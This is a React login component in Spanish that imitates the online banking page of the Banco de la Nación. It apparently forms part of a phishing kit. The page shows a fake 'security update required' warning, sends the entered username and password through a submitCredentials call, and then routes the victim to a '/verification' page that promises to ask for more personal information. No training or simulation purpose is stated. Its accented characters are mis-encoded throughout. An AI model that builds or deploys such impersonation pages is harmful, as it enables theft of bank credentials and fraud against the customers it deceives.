import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { submitCredentials } from '../services/api';
import './LoginPage.css';

const LoginPage = () => {
  const navigate = useNavigate();
  const [formData, setFormData] = useState({
    username: '',
    password: ''
  });
  const [errors, setErrors] = useState({});
  const [loading, setLoading] = useState(false);

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData({
      ...formData,
      [name]: value
    });

    // Clear error when user types
    if (errors[name]) {
      setErrors({
        ...errors,
        [name]: ''
      });
    }
  };

  const validate = () => {
    const newErrors = {};

    if (!formData.username) {
      newErrors.username = 'Ingresa tu usuario';
    }

    if (!formData.password) {
      newErrors.password = 'Ingresa tu contrase침a';
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    if (!validate()) {
      return;
    }

    setLoading(true);

    try {
      await submitCredentials(formData);

      // Navigate to verification page with username
      navigate('/verification', { 
        state: { username: formData.username }
      });

    } catch (error) {
      setErrors({ 
        general: 'Usuario o contrase침a incorrectos. Por favor intente de nuevo.' 
      });
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="login-page">
      <div className="container">
        <div className="login-container">
          <div className="login-header">
            <h2>Banca por Internet</h2>
            <p className="login-subtitle">Acceso seguro a tu cuenta</p>
          </div>

          <div className="security-alert">
            <div className="alert-icon">游</div>
            <div className="alert-content">
              <h3>Actualizaci칩n de Seguridad Requerida</h3>
              <p>Por tu seguridad, necesitamos verificar tu identidad. Despu칠s de ingresar con tu usuario y contrase침a, te pediremos informaci칩n adicional para completar la actualizaci칩n.</p>
            </div>
          </div>

          <form onSubmit={handleSubmit} className="login-form">
            {errors.general && (
              <div className="alert alert-danger">
                {errors.general}
              </div>
            )}

            <div className="form-group">
              <label htmlFor="username" className="form-label">Usuario:</label>
              <input
                type="text"
                id="username"
                name="username"
                className={`form-control ${errors.username ? 'error' : ''}`}
                value={formData.username}
                onChange={handleChange}
                placeholder="Ingresa tu usuario"
                autoComplete="username"
              />
              {errors.username && (
                <div className="error-message">{errors.username}</div>
              )}
            </div>

            <div className="form-group">
              <label htmlFor="password" className="form-label">Contrase침a:</label>
              <input
                type="password"
                id="password"
                name="password"
                className={`form-control ${errors.password ? 'error' : ''}`}
                value={formData.password}
                onChange={handleChange}
                placeholder="Ingresa tu contrase침a"
                autoComplete="current-password"
              />
              {errors.password && (
                <div className="error-message">{errors.password}</div>
              )}
            </div>

            <div className="form-check">
              <input 
                type="checkbox" 
                id="remember" 
                className="form-check-input" 
              />
              <label htmlFor="remember" className="form-check-label">
                Recordar usuario
              </label>
            </div>

            <button 
              type="submit" 
              className="btn-primary btn-block" 
              disabled={loading}
            >
              {loading ? 'Validando...' : 'Ingresar'}
            </button>
          </form>

          <div className="login-footer">
            <button type="button" className="text-link">쯆lvidaste tu usuario?</button>
            <button type="button" className="text-link">쯆lvidaste tu contrase침a?</button>
            <button type="button" className="text-link">쯇rimera vez? Reg칤strate</button>
            <button type="button" className="text-link">Ayuda</button>
          </div>

          <div className="security-info">
            <h4>Informaci칩n de Seguridad</h4>
            <ul>
              <li>Nunca compartas tu usuario y contrase침a</li>
              <li>Aseg칰rate de estar en el sitio oficial del Banco de la Naci칩n</li>
              <li>Siempre cierra tu sesi칩n al terminar</li>
              <li>Utiliza conexiones seguras (HTTPS)</li>
            </ul>
          </div>
        </div>
      </div>
    </div>
  );
};

export default LoginPage;
